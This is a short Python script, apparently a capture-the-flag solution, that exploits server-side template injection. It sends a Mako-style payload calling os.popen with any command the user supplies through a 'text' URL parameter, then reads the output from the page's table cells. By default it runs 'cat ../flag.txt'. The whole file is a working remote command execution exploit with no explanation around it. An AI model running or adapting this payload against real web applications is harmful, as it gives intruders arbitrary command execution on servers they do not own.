import requests
import sys
from bs4 import BeautifulSoup

def print_usage():
    print("Usage:")
    print(f"  python3 {sys.argv[0]} <url> [command]")
    print("  <url>     - Target URL (e.g., http://example.com/vuln)")
    print("  [command] - Optional command to execute (default: 'cat ../flag.txt')")

# Argument check
if len(sys.argv) < 2:
    print("[-] Error: Missing required arguments.\n")
    print_usage()
    sys.exit(1)

# Get arguments
url = sys.argv[1]
cmd = sys.argv[2] if len(sys.argv) > 2 else "cat ../flag.txt"

print(f"[+] Target URL: {url}")
print(f"[+] Command to execute: {cmd}")

# Create raw payload
payload = f'<% import os; x=os.popen("{cmd}").read() %> ${{x}}'

# Construct full URL with payload in `text` parameter
full_url = f"{url}?text={payload}"

try:
    response = requests.get(full_url)
except requests.exceptions.RequestException as e:
    print(f"[-] Error sending request: {e}")
    sys.exit(1)

soup = BeautifulSoup(response.text, 'html.parser')

# Extract all <td> tags from the table
table_cells = soup.select("table.table-bordered td")

if table_cells:
    print(f"[+] response: \n{table_cells[-1].text.strip()}")
else:
    print("[-] Flag not found!")
